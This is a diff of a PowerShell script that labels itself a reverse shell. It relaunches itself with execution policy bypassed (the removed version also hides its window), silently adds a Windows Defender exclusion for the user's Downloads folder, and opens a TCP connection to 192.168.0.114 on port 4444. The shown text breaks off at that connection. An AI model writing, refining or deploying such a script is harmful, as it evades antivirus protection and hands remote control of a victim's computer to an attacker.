@@ -1,23 +1,19 @@
-# --- Relaunch in hidden window if not already hidden ---
-if (-not ([System.Diagnostics.Process]::GetCurrentProcess().StartInfo.WindowStyle -eq 'Hidden')) {
-    Start-Process powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$PSCommandPath"
-    Start-Sleep -Milliseconds 500  # Let child start before parent exits
-    return  # Use return instead of exit to prevent full termination during script block
+function Ensure-WindowsPowerShell {
+    if ($PSVersionTable.PSEdition -ne 'Desktop') {
+        $script = $MyInvocation.MyCommand.Definition
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File "$script""
+        exit
+    }
 }
 
-# --- Ensure it's Windows PowerShell, not Core ---
-if ($PSVersionTable.PSEdition -ne 'Desktop') {
-    Start-Process powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$PSCommandPath"
-    Start-Sleep -Milliseconds 500
-    return
-}
+Ensure-WindowsPowerShell
 
 try {
-    # Defender exclusion (fails silently if no admin)
+    # Attempt Defender Exclusion (will fail silently if not admin)
     Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
 
-    # === Reverse shell ===
-    $client = "192.168.0.113"
+    # === Reverse shell setup ===
+    $client = "192.168.0.114"
     $port = 4444
 
     $tcp = New-Object System.Net.Sockets.TcpClient($client, $port)
